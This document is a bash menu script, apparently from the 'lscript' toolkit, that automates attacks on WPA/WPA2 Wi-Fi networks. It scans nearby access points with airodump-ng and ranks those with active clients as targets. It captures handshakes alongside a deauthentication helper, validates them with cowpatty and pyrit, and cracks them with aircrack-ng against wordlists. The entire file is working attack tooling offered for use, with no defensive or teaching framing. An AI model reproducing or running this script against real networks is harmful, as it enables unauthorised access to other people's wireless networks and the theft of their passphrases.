#! /bin/bash
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
#-----------------FUNCTIONS-----------------
function defaults_lh1
{
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#path for keyboard shortcuts
	KSPATH=""$LPATH"/ks"
	export KSPATH
#making sure the kspath is set
	if [[ ! -d "$KSPATH" ]]
	then
		mkdir "$KSPATH"
	fi
#ALFA SUPPORT SETTING
	if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
	then
		read ALFA < "$LPATH"/settings/AWUS036ACH.txt
	else
		ALFA="no"
	fi
#yellow start 
	YS="\e[1;33m"
#blue start 
	BS="\e[0;34m"
#color end
	CE="\e[0m"
#red start
	RS="\e[1;31m"
#black start
	BLS="\e[0;30m"
#dark gray start
	DGYS="\e[1;30m"
#light blue start
	LBS="\e[1;34m"
#green start
	GNS="\e[0;32m"
#light green start
	LGNS="\e[1;32m"
#cyan start
	CYS="\e[0;36m"
#light cyan start
	LCYS="\e[1;36m"
#light red start
	DRS="\e[0;31m"
#purple start
	PS="\e[0;35m"
#light purple start
	LPS="\e[1;35m"
#brown start
	BRS="\e[0;33m"
#light gray start
	LGYS="\e[0;37m"
#white start
	WHS="\e[1;37m"
#setting custom color for logo
	if [[ -f "$LPATH"/settings/logocolor.txt ]]
	then
		read COL < "$LPATH"/settings/logocolor.txt
	else
		COL="$RS"
	fi
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return
	READAK="read -n 1"
#default MAC when starting monitor
	DEFMAC="00:11:22:33:44:55"
	
	wififb="wififb"
}
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function scan_networks
{
if [[ "$TARGB" = "" ]]
then
	pre_scan
else
	ap_sort_and_choose
	if [[ "$APCHOOSE" = "r" ]]
	then
		TARGB=""
		pre_scan
	elif [[ "$APCHOOSE" = "back" || "$APCHOOSE" = "b" ]]
	then
		break
	fi	
fi
}
function start_capture
{
export HANDF
if [[ "$HANDF" != "0" && "$HANDF" != "deauth" ]]
then
	if [[ -f "$HANDCAP" ]]
	then
		rm $HANDCAP
	fi
	gnome-terminal -q --geometry 70x10+0+0 -- lh2
	HANDFORDEAUTH="/root/handshakes/$HANDF-01.csv"
	export HANDFORDEAUTH
	airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM # & jobs -p > /root/lscript/dpidd.txt
	#~ airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
	#kill the deauth menu if running
	if [[ -f "$LPATH"/dpid.txt ]]
	then
		read DPID < "$LPATH"/dpid.txt
		PIF=$(ps -A | grep "$DPID")
		if [[ "$PIF" != "" ]]
		then
			kill $DPID
		fi
	fi
	#kill the autochecker for handshake if running
	if [[ -f "$LPATH"/dpiddd.txt ]]
	then
		read DPID < "$LPATH"/dpiddd.txt
		PIF=$(ps -A | grep "$DPID")
		if [[ "$PIF" != "" ]]
		then
			kill $DPID
		fi
	fi
	if [[ -f "/root/lscript/dpid*.txt" ]]
	then
		rm /root/lscript/dpid*.txt
	fi
	validhandshake
	exec bash "$0"
else
	if [[ -f /root/handshakes/deauth-01.csv || -f /root/handshakes/deauth-01.cap || -f /root/handshakes/deauth-01.kismet.csv || -f /root/handshakes/deauth-01.kismet.netxml ]]
	then
		rm -f /root/handshakes/deauth-01.*
	fi
	HANDF="deauth"
	HANDFORDEAUTH="/root/handshakes/deauth-01.csv"
	gnome-terminal -q --geometry 70x10+0+0 -- lh2
	airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
	if [[ -f "$LPATH"/dpid.txt ]]
	then
		read DPID < "$LPATH"/dpid.txt
		PIF=$(ps -A | grep "$DPID")
		if [[ "$PIF" != "" ]]
		then
			kill $DPID
		fi
	fi
	echo -e "Start capturing on a file?"$YNYES""
	read SCF
	if [[ "$SCF" = "n" ]]
	then
		clear
		exec bash "$0"
	else
		while true
		do
			clear
			echo -e "Enter the name of the handshake file(no extension): "
			read -e HANDF
			if [[ ! -f "/root/handshakes/$HANDF-01.cap" ]]
			then
				break
			else
				echo -e ""$RS"File already exists."$CE""
				sleep 2
				continue
			fi
		done
		HANDFFP="/root/handshakes/$HANDF-01.cap"
		export HANDFFP
		if [[ -f "$HANDFFP" ]]
		then
			rm $HANDFFP
		fi
		gnome-terminal -q --geometry 70x10+0+0 -- lh2
		airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
		if [[ -f "$LPATH"/dpid.txt ]]
		then
			read DPID < "$LPATH"/dpid.txt
			PIF=$(ps -A | grep "$DPID")
			if [[ "$PIF" != "" ]]
			then
				kill $DPID
			fi
		fi
		if [[ -f "/root/lscript/dpid*.txt" ]]
		then
			rm /root/lscript/dpid*.txt
		fi
		validhandshake
		exec bash "$0"
	fi
fi
}
function autoapselect
{
file="/root/lscript/tempairodump-01.csv"
if [[ -f "$file" ]]
then
	lines=$(cat $file | awk '/WPA|WPA2|OPN|WEP/ {print}' | awk 'END{print NR}')
	#add safety-lines
	lines=$((lines+10))
else
	lines=0
fi
n2=1
power=100
if [[ "$lines" != 0 ]]
then
	while [ $n2 -le "$lines" ]
	do
		n3=$((n2+2))
		##apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /WPA|WPA2/)print $8}') BEFORE UPDATE
		apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /WPA|WPA2/)print $9}')
		aopen[$n2]=0
		if [[ ${apower[$n2]} = "" ]]
		then
			aopen[$n2]=1
			apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $9}')
		fi
		adata[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $11}')
		if [[ ${adata[$n2]} = "" ]]
		then
			adata[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $11}')
		fi
		#aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $19}') not working in latest 1.5.2 update
		aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $14}')
		if [[ ${aessid[$n2]} = "" ]]
		then
			aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $14}')
		fi
		achannel[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $4}')
		if [[ ${achannel[$n2]} = "" ]]
		then
			achannel[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $4}')
		fi
		amac[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $1}')
		if [[ ${amac[$n2]} = "" ]]
		then
			amac[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $1}')
		fi
		powerunfixed="${apower[$n2]}"
		apowerfixed[$n2]="$powerunfixed"
		apowerfixed[$n2]=$((power+apowerfixed[$n2]))
		#echo ""$n2") "${apowerfixed[$n2]}"% "${amac[$n2]}" "${achannel[$n2]}" "${adata[$n2]}" "${aessid[$n2]}""
		###DEBUGGING
		#~ echo -e "n2="$n2" ${aessid[$n2]}"
		n2=$(( n2+1 ))
	done
	n3=1
	while [ $n3 -le "$lines" ]
	do
		n=1
		topsignal=100
		while [[ "$n" -le "$lines" ]]
		do
			if [[ "${apowerfixed[$n]}" -le "$topsignal" ]]
			then
				lowestn="$n"
				topsignal="${apowerfixed[$n]}"				
			fi
			n=$((n+1))
		done 
		zn[$n3]=$lowestn
		zopen[$n3]=${aopen[$lowestn]}
		zdata[$n3]=${adata[$lowestn]}
		zessid[$n3]=${aessid[$lowestn]}
		zpowerfixed[$n3]=${apowerfixed[$lowestn]}
		zmac[$n3]=${amac[$lowestn]}
		zchannel[$n3]=${achannel[$lowestn]}
		apowerfixed[$lowestn]=101
		n3=$((n3+1)) 
	done
	n3=1
	echo -e ""$BS"  BLUE"$CE"=OPEN NETWORK OR WEP PROTECTED"
	echo -e ""$YS"YELLOW"$CE"=WPA/WPA2 NETWORK WITH ACTIVE CLIENTS"
	echo -e ""$RS"   RED"$CE"=WPA/WPA2 NETWORK WITHOUT ACTIVE CLIENTS"
	echo -e "_________________________________________________________________________________________"
	echo -e "     POWER ESSID                                  MAC               CLIENTS  DATA"
	while [ $n3 -le "$lines" ]
	do
		#fix for \x00\x00\x00 bug on airodump:
			checkbug=$(echo "${zessid[$n3]}" | grep "\x00")
			if [[ "$checkbug" == "" ]]
			then
				size="${#zessid[$n3]}"
			else
				zessidfixed=$(echo "${zessid[$n3]}" | cut -d '\' -f1)
				size="${#zessidfixed}"
			fi
		##
		
		##calculating how many underscores needed for output
		calc=$(( 40-size ))
		numcalc=1
		SPACES=""
		while [[ "$numcalc" != "$calc" ]]
		do
			SPACES=""$SPACES"_"
			numcalc=$(( numcalc+1 ))
		done
		if [[ "$n3" -le 9 ]]
		then
			num=" "$n3""
		else
			num=$n3
		fi
		size=${#zpowerfixed[$n3]}
		if [[ "$size" == 3 ]]
		then
			space=""
		elif [[ "$size" == 2 ]]
		then
			space=" "
		elif [[ "$size" == 1 ]]
		then
			space="  "
		fi
		DATAA=" "$RS"0"$CE""
		if [[ ${zpowerfixed[$n3]} -lt 100 ]]
		then
			size2=${#zessid[$n3]}
			if [[ "$size2" -eq 36 ]]
			then
				zessid[$n3]="____________________________________"
			fi
			START=""
			if [[ ${zopen[$n3]} = 1 ]]
			then
				START="$BS"
				if [[ ${zdata[$n3]} -gt 0 ]]
				then
					CLIENTS="YES"
					DATAA="${zdata[$n3]}"
				else
					CLIENTS="NO "
				fi
			else
				if [[ ${zdata[$n3]} -gt 0 ]]
				then
					CLIENTS="YES"
					START="$YS"
					DATAA="${zdata[$n3]}"
				else
					START="$RS"
					CLIENTS="NO "
				fi
			fi
			echo -e ""$YS""$num""$CE") "$START"${space}"${zpowerfixed[$n3]}"%   "${zessid[$n3]}""$SPACES""${zmac[$n3]}" "$CLIENTS"     "$DATAA""$CE""
		fi
		n3=$((n3+1))
	done
else
	echo -e ""$RS"No networks found nearby."$CE""
fi
echo -e ""$YS" r"$CE") rescan"
echo -e ""$YS" b"$CE") Go back"
echo -e "Choose: "
}
function capture_again
{
			echo -e "Capture handshake again on the same network? "$YNYES""
			read CAGAIN
			if [[ ! "$CAGAIN" = "n" ]]
			then
				gnome-terminal -q --geometry 70x10+0+0 -- lh2
				airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
				validhandshake
				exec bash "$0"
			fi
}
function ap_sort_and_choose
{
while true
do
	clear
	autoapselect
	read APCHOOSE
	clear
	if [[ "$APCHOOSE" = "back" || "$APCHOOSE" = "b" ]]
	then
		break
	elif [[ "$APCHOOSE" = "r" ]]
	then
		JC=0
		break
	elif [[ "$APCHOOSE" -le "$lines" && "$APCHOOSE" -ge 1 ]]
	then
		if [[ ${zopen[$APCHOOSE]} = 1 ]]
		then
			echo -e ""$RS"You selected an open or a WEP protected network.Please select a WPA/WPA2 protected network."$CE""
			echo -e "Press "$YS"enter"$CE" to go back"
			read
			break
		fi
		TARGB="${zmac[$APCHOOSE]}"
		TARGC="${zchannel[$APCHOOSE]}"
		TARGE="${zessid[$APCHOOSE]}"
		while true
		do
			clear
			echo -e "Enter the name of the handshake file(no extention)(e.g: "$YS"hand1"$CE")"
			echo -e "Type "$YS""0""$CE" for no file"
			read -e HANDF
			if [[ "$HANDF" = 0 ]]
			then
				if [[ -f /root/handshakes/deauth-01.csv || -f /root/handshakes/deauth-01.cap || -f /root/handshakes/deauth-01.kismet.csv || -f /root/handshakes/deauth-01.kismet.netxml ]]
				then
					rm -f /root/handshakes/deauth-01.*
				fi
				HANDF="deauth"
				HANDFORDEAUTH="/root/handshakes/deauth-01.csv"
				break
			else
				if [[ ! -f "/root/handshakes/$HANDF-01.csv" ]]
				then
					HANDFORDEAUTH="/root/handshakes/$HANDF-01.csv"
					break
				else
					clear
					echo -e ""$RS"File already exists."$CE""
					sleep 2
					continue	
				fi				
			fi
		done
		HANDFFP="/root/handshakes/"$HANDF"-01.cap"
		HANDCAP="/root/handshakes/"$HANDF"-01.cap"
		export HANDFORDEAUTH
		export HANDCAP
		export HANDFFP
		export HANDF
		export TARGB
		export TARGC
		export TARGE
		clear
		start_capture
		break
	fi
done
}
function pre_scan
{
while true
do
	if [[ "$JC" != 1 ]]
	then
		remove_temps
		echo -e "Select what to scan: "
		echo -e ""$YS"ENTER"$CE") All channels"
		echo -e " "$YS"1"$CE"-"$YS"13"$CE") Specific channel"
		echo -e ""$YS"    b"$CE") Go back"
		read CHANNELSL
		if [[ "$CHANNELSL" = "" ]]
		then
			FJC=0
			JC=1
			airodump-ng $WLANNM -w /root/lscript/tempairodump
		elif [[ "$CHANNELSL" = "back" || "$CHANNELSL" = "b" ]]
		then
			clear
			CH="0"
			break
		else
			FJC=0
			JC=1
			airodump-ng -c $CHANNELSL $WLANNM -w /root/lscript/tempairodump
		fi
	fi
		ap_sort_and_choose
		if [[ "$APCHOOSE" = "r" ]]
		then
			JC=0
			continue
		elif [[ "$APCHOOSE" = "back" || "$APCHOOSE" = "b" ]]
		then
			break
		fi	
	done
}
function remove_temps
{
		rm -f /root/lscript/tempairodump*		
		rm -f /root/lscript/dpid*.txt
}
function validate_with_pyrit
{
	clear
	echo -e "Checking handshake with pyrit..."
	TEMP=$(pyrit -r "$HANDCAP" analyze 2>/dev/null) 
	TEMPHAND=$(echo "$TEMP" | grep "No valid EAOPL-handshake + ESSID detected.")
	clear
	if [[ "$TEMPHAND" = "" ]]
	then
		VALIDH=1
		#TEMPHANDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "good")
		TEMPHANDD=$(echo "$TEMP" | grep "good")
		if [[ "$TEMPHANDD" = "" ]]
		then
			TEMPHAD=$(echo "$TEMP" | grep "workable")
			if [[ "$TEMPHAD" = "" ]]
			then	
				#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
				TEMPHANDDD=$(echo "$TEMP" | grep "bad")
				if [[ "TEMPHANDDD" = "" ]]
				then
					echo -e "Handshake found!(Status: "$RS"unknown"$CE")"
				else
					echo -e "Handshake found!(Status: "$RS"bad"$CE")"
				fi
				echo -e ""
				echo -e "Do you want to keep it?"$YNNO": "
				read KORD
				if [[ "$KORD" = "y" ]]
				then
					VALIDH=1
				else
					VALIDH=0
				fi
				sleep 0.1
			else
				echo -e "Handshake found!(Status: "$RS"workable"$CE")"
			fi			
		else
			echo -e "Valid handshake found!(Status: "$YS"good"$CE")"
			sleep 3
		fi
	else
		VALIDH=0
		echo -e ""$RS"No handshake found."$CE""
		sleep 2
	fi
}
function validate_with_cowpatty
{
	clear
	echo -e "Checking handshake with cowpatty..."
	sleep 1
	TEMPHAND=$(cowpatty -c -r "$HANDCAP" | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase.")
	clear
	if [[ "$TEMPHAND" = "" ]]
	then
		VALIDH=0
		echo -e ""$RS"No handshake found"$CE""
		sleep 1
		echo -e ""
		echo -e "Do you want to check it with pyrit? "$YNYES": "
		read CWP
		if [[ "$CWP" = "n" ]]
		then
			VALIDH=0
		else
			validate_with_pyrit
		fi
	else
		VALIDH=1
		echo -e ""$YS"Valid handshake found!"$CE""
		sleep 2
	fi
}
function handshake_clean
{
	clear
	pyrit -r $HANDCAP -o /root/handshakes/"$HANDF"-cleaned.cap strip && echo -e "CLEANED"
	sleep 2
}
function validhandshake
{
echo -e "Did you capture the handshake?"$YNYES""
read HANDVALID
if [[ "$HANDVALID" = "n" ]]
then
	echo -e "Removing the file..."
	sleep 2
	rm /root/handshakes/"$HANDF"-01*
	#~ remove_temps
	FJC=0
else
	FJC=1
	HANDCAP=/root/handshakes/"$HANDF"-01.cap
	validate_with_cowpatty
	if [[ "$VALIDH" = "0" ]]
	then
		FJC=0
		echo -e "Couldn't validate your handshake. Delete it? "$YNYES""
		read NOVALDEL
		if [[ ! "$NOVALDEL" = "n" ]]
		then
			rm /root/handshakes/"$HANDF"-01.*
			clear
			capture_again
		fi
	else
		clear
		echo -e "Do you want to clean your handshake?"$YNYES""
		read HANDCC
		clear
		if [[ "$HANDCC" = "n" ]]
		then
			echo -e "Your handshake file is saved in: /root/handshakes/"$HANDF"-01.cap"
			CTD="/root/handshakes/"$HANDF"-01.cap"
		else
			pyrit -r $HANDCAP -o /root/handshakes/"$HANDF"-cleaned.cap strip && echo -e "Your handshake is now cleaned! You can find it at: /root/handshakes/"$HANDF"-cleaned.cap"
			CTD="/root/handshakes/$HANDF-cleaned.cap"
		fi
		echo -e ""
		echo -e "Do you want to copy the handshake file to Desktop?"$YNYES""
		read CTDQ
		if [[ ! "$CTDQ" == "n" ]]
		then
			cp "$CTD" /root/Desktop
			echo -e ""$YS"Done!"$CE""
			sleep 1
		fi
		echo -e "$PAKTC"
		$READAK
	fi
			
fi
clear
}
function capture_handshake
{
while true
do
	AA=-1
	clear
	echo -e ""$YS" 1"$CE") Use selected: $TARGE"
	echo -e ""$YS" 2"$CE") Set another BSSID and CHANNEL"
	echo -e ""$YS" r"$CE") Scan again"
	echo -e ""$YS" b"$CE") Go back"
	echo -e "Choose: "
	read CAPTH
	if [[ "$CAPTH" = "back" || "$CAPTH" = "b" ]]
	then
		break
	elif [[ "$CAPTH" = "2" ]]
	then
		echo -e "Enter your target's bssid: "
		read -e TARGB
		echo -e "Enter your target's channel: "
		read -e TARGC
		echo -e "Enter the name of the handshake file(no extension): "
		echo -e "(don't use the same name twice)"
		echo -e "Type "$YS""0""$CE" for no file"
		read -e HANDF
		TARGE=""
		HANDFFP="/root/handshakes/"$HANDF"-01.cap"
		HANDCAP="/root/handshakes/"$HANDF"-01.cap"
		export HANDCAP
		export HANDFFP
		export TARGB
		export TARGC
		export TARGE
		clear
		start_capture
		break
	elif [[ "$CAPTH" = "r" ]]
	then	
		scan_networks
		break
	elif [[ "$CAPTH" = "1" ]]
	then
		if [[ "$TARGE" = "" ]]
		then
			echo -e "No network selected.Start scanning and select your target."
			sleep 4
			break
		else
			echo -e "Enter the name of the handshake file(no extension): "
			echo -e "(don't use the same name twice)"
			echo -e "Type "$YS""0""$CE" for no file"
			read -e HANDF
			TARGE=""
			HANDFFP="/root/handshakes/"$HANDF"-01.cap"
			HANDCAP="/root/handshakes/"$HANDF"-01.cap"
			HANDFORDEAUTH="/root/handshakes/"$HANDF"-01.cap"
			export HANDCAP
			export HANDFFP
			clear
			start_capture
			break
		fi
	fi
done
}
function aircrack_handshakejust
{
	clear
	echo -e "Do you want to use the file you just captured?"$YNYES": "
	read -e YORN
	clear
	if [[ "$YORN" = "n" ]]
	then
		cd /root/handshakes
		ls | sort
		cd
		echo -e "Enter handshake name(no extension)(on folder /root/handshakes/): "
		read -e HANDFK
		HANDFFK="/root/handshakes/$HANDFK-01.cap"
		if [[ -f "$HANDFFK" ]]
		then
			echo -e "OK."
			HANDFFP="$HANDFFK"
			sleep 1
			clear
		else
			echo -e "File $HANDFK does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
		cd /root/wordlists
		ls | sort
		cd
		echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
		read -e WORDF
		WORDFF="/root/wordlists/$WORDF"
		if [[ -f "$WORDFF" ]]
		then
			echo -e "OK."
			sleep 1
			clear
		else
			echo -e "File $WORDF does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
	else
		cd /root/wordlists
		ls | sort
		cd
		echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
		read -e WORDF
		WORDFF="/root/wordlists/$WORDF"
		if [[ -f "$WORDFF" ]]
		then
			echo -e "OK."
			sleep 1
		else
			echo -e "File $WORDF does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
	fi
	clear
	aircrack-ng -w $WORDFF $HANDFFP
	echo -e "$PAKTGB"
	$READAK
}
function aircrack_handshake
{
	clear
	cd /root/handshakes
	ls | sort
	cd
	echo -e ""$YS" b"$CE") Go back"
	echo -e "Enter handshake name(include extension)(on folder /root/handshakes/): "
	read -e HANDFT
	if [[ "$HANDFT" = "back" || "$HANDFT" = "b" ]]
	then
		clear
		exec bash $0
	fi
	HANDFFT="/root/handshakes/$HANDFT"
	if [[ -f "$HANDFFT" ]]
	then
		echo -e "OK."
		sleep 1
		clear
	else
		echo -e ""$RS"File $HANDFT does not exist"$CE""
		sleep 2
		clear
		exec bash $0
	fi
	cd /root/wordlists
	ls | sort
	cd
	echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
	read -e WORDF
	WORDFF="/root/wordlists/$WORDF"
	if [[ -f "$WORDFF" ]]
	then
		echo -e "OK."
		sleep 1
		clear
	else
		echo -e "File $WORDF does not exist"
		sleep 2
		clear
		continue
	fi

	clear
	aircrack-ng -w $WORDFF $HANDFFT
	echo -e "$PAKTGB"
	$READAK
}
function main_handshake_options
{
while true
do
clear

if [[ -f "/root/handshakes/*.csv" ]]
then
	rm /root/handshakes/*.csv
	rm /root/handshakes/*.netxml
fi
TERMINALTITLE="HANDSHAKE"
dash_calc
printf '\033]2;HANDSHAKE\a'
if [[ "$TARGE" = "" ]]
then
	echo -e ""$YS" 1"$CE") Scan networks nearby     Selected:"$RS"None"$CE""
else
	echo -e ""$YS" 1"$CE") Scan networks nearby     Selected:"$YS""$TARGE""$CE""
fi
echo -e ""$YS" 2"$CE") Capture handshake"
echo -e ""$YS" 3"$CE") Aircrack the handshake"
echo -e ""$YS" 4"$CE") Verify a handshake"
echo -e ""$YS" 5"$CE") Clean a handshake"
echo -e ""$YS" 6"$CE") Remove .csv and .netxml files"
echo -e ""$YS" 0"$CE") Exit"
echo -e "Choose: "
sleep 1
CH=0
read -e AA
clear
if [[ "$AA" = "1" ]]
then
	CH=1
	scan_networks
elif [[ "$AA" = "2" ]]
then
	capture_handshake
elif [[ "$AA" = "3" ]]
then
	if [[ "$FJC" = "1" ]]
	then
		AAGAIN=1
		aircrack_handshakejust
	else
		AAGAIN=2
		aircrack_handshake
	fi
elif [[ "$AA" = "4" ]]
then
	echo -e "------------------You are in /root/handshakes folder--------------------"
	ls /root/handshakes
	echo -e "Type the name of the handshake you want to check:(e.g: "$YS"hand1-01"$CE")"
	echo -e ""$RS"No extention"$CE""
	read HANDF
	if [[ ! -f /root/handshakes/"$HANDF" ]]
	then
		if [[ -f /root/handshakes/"$HANDF".cap ]]
		then
			HANDCAP=/root/handshakes/"$HANDF".cap
		else
			if [[ -f /root/handshakes/"$HANDF"-01.cap ]]
			then
				HANDCAP=/root/handshakes/"$HANDF"-01.cap
			else
				echo -e "Handshake file not found!"
				sleep 3
				continue
			fi
		fi
	else
		HANDCAP=/root/handshakes/"$HANDF"
	fi
	while true
	do
		clear
		echo -e ""$BS"Validate with: "$CE""
		echo -e ""$YS" 1"$CE") Pyrit"
		echo -e ""$YS" 2"$CE") Cowpatty"
		echo -e "Choose: "
		read VLD
		if [[ "$VLD" = 1 ]]
		then
			validate_with_pyrit
			echo -e "$PAKTGB"
			$READAK
			break
		elif [[ "$VLD" = 2 ]]
		then
			validate_with_cowpatty
			echo -e "$PAKTGB"
			$READAK
			break
		elif [[ "$VLD" = "b" || "$VLD" = "back" || "$VLD" = 00 ]]
		then
			break
		fi
	done
elif [[ "$AA" = "5" ]]
then
	echo -e "------------------You are in /root/handshakes folder--------------------"
	ls /root/handshakes
	echo -e "Type the name of the handshake you want to clean:(e.g: "$YS"hand1-01"$CE")"
	echo -e ""$RS"No extention"$CE""
	read HANDF
	if [[ ! -f /root/handshakes/"$HANDF" ]]
	then
		if [[ -f /root/handshakes/"$HANDF".cap ]]
		then
			HANDCAP=/root/handshakes/"$HANDF".cap
		else
			if [[ -f /root/handshakes/"$HANDF"-01.cap ]]
			then
				HANDCAP=/root/handshakes/"$HANDF"-01.cap
			else
				echo -e "Handshake file not found!"
				sleep 3
				continue
			fi
		fi
	else
		HANDCAP=/root/handshakes/"$HANDF"
	fi
	handshake_clean
elif [[ "$AA" = "6" ]]
then
	rm -f /root/handshakes/*.csv
	rm -f /root/handshakes/*.netxml
	sleep 0.2
	clear
	exec bash "$0"
elif [[ "$AA" = "0" ]]
then
	exit
else
	clear
	continue
fi
done	
}
#-------------------------------------------
defaults_lh1
main_handshake_options
